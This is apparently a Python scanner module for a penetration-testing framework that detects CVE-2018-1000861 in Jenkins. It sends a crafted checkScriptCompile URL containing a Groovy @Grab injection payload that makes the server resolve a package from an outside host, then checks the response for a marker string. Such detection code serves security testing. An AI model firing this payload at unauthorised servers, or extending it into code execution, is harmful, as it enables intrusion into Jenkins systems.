#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Jenkins 2."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Jenkins - Remote Command Injection Detection',
        'description': 'Jenkins 2.153 and earlier and LTS 2.138.3 and earlier are susceptible to a remote command injection via stapler/core/src/main/java/org/kohsuke/stapler/MetaClass.java that allows attackers to invoke some methods on Java objects by accessing crafted URLs that were not intended to be invoked this way.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2018', 'packetstorm', 'kev', 'vulhub', 'rce', 'jenkins', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/vulhub/vulhub/tree/master/jenkins/CVE-2018-1000861',
            'https://nvd.nist.gov/vuln/detail/CVE-2018-1000861',
            'https://jenkins.io/security/advisory/2018-12-05/#SECURITY-595',
            'http://packetstormsecurity.com/files/166778/Jenkins-Remote-Code-Execution.html',
            'https://access.redhat.com/errata/RHBA-2019:0024',
        ],
        'cve': 'CVE-2018-1000861',
    }

    def run(self):
        r = self.http_request(method="GET", path='/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile?value=@GrabConfig(disableChecksums=true)%0a@GrabResolver(name=%27test%27,%20root=%27http://aaa%27)%0a@Grab(group=%27package%27,%20module=%27vulntest%27,%20version=%271%27)%0aimport%20Payload;', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('package#vulntest',)
        if (any(m in body for m in body_any)):
            self.set_info(
                severity='critical',
                reason="Jenkins - Remote Command Injection detected",
                path='/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile?value=@GrabConfig(disableChecksums=true)%0a@GrabResolver(name=%27test%27,%20root=%27http://aaa%27)%0a@Grab(group=%27package%27,%20module=%27vulntest%27,%20version=%271%27)%0aimport%20Payload;',
            )
            return True
        return False

